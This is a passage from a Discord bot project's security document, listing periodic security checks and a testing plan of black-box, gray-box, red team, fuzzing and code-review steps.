- [ ] Run dependency vulnerability scan (pip audit)

### Quarterly Checks

- [ ] Generate new SSH key pair
- [ ] Full security audit (penetration testing)
- [ ] Review all logged errors for leaks
- [ ] Update all dependencies
- [ ] Review Discord API changes for security impact

### Annually Checks

- [ ] Third-party security audit
- [ ] Disaster recovery drill
- [ ] Review and update incident response plan
- [ ] Security training for all contributors

---

## Testing Strategy (Independent Verification)

**How to test security WITHOUT "testing our own validation":**

### 1. Black Box Testing

**Approach:** Treat bot as closed system, test only via external interfaces

**Tools:**

- Discord user account (not admin)
- Burp Suite for webhook interception
- Custom Python scripts for fuzzing

**Tests:**

- Can you bypass rate limiting?
- Can you inject SQL via bot commands?
- Can you crash the bot?
- Can you make bot leak secrets?

---

### 2. Gray Box Testing

**Approach:** Limited code access, test with some knowledge

**Tools:**

- Source code review
- Static analysis (Bandit, Semgrep)
- Dependency scanning (pip audit)

**Tests:**

- Grep for `eval(`, `exec(`, `subprocess.run(`
- Find all SQL queries, verify parameterization
- Check all user input handling
- Audit all log statements

---

### 3. Red Team Exercise

**Approach:** Full adversarial simulation

**Setup:**

1. Red team: Tries to compromise bot (3 people, 1 day)
2. Blue team: Defends and monitors (1 person)
3. Purple team: Documents findings (1 person)

**Scenarios:**

- Scenario 1: External attacker (no access)
- Scenario 2: Discord server member (low privilege)
- Scenario 3: VPS compromise
- Scenario 4: Insider threat (moderator)

**Success Metrics:**

- Time to compromise
- What was compromised (database, server, bot)
- What data was exfiltrated
- What was NOT detected

---

### 4. Automated Fuzzing

**Tool:** AFL, LibFuzzer, or custom fuzzer

**Targets:**

- Stats file parser (feed random data)
- Discord command parser
- Filename validation

**Run:** 24 hours continuous, monitor for crashes

---

### 5. Code Review Checklist

**Manual review by someone who didn't write the code:**

**Checklist:**

- [ ] All user input validated
- [ ] No SQL string concatenation
- [ ] No `eval()` or `exec()` on user input
- [ ] All subprocess calls sanitized
- [ ] All file paths validated
- [ ] Secrets not hardcoded
- [ ] Logging doesn't leak secrets
- [ ] Rate limiting on all endpoints
- [ ] Timeouts on all I/O operations
- [ ] Input length limits enforced

---

## Conclusion

**This is NOT a complete security audit.**
**This is a STARTING POINT for continuous security improvement.**

### Key Takeaways

1. **We have MANY untested assumptions**
2. **Current testing validates our own code (circular)**
3. **Real security requires independent verification**
4. **Threat model is theoretical until red team tested**
5. **Security is a process, not a checklist**

### Next Steps

1. Fix CRITICAL vulnerabilities immediately
2. Implement independent security testing
3. Schedule quarterly red team exercises
4. Continuously update this document
5. Never assume "it's probably fine"

---

**Document Status:** LIVING DOCUMENT - Update after every security change
**Last Reviewed:** 2025-12-14
**Next Review:** 2026-01-14
**Responsible:** All contributors

---

**Remember: The goal is not to pass tests, but to ACTUALLY BE SECURE.**
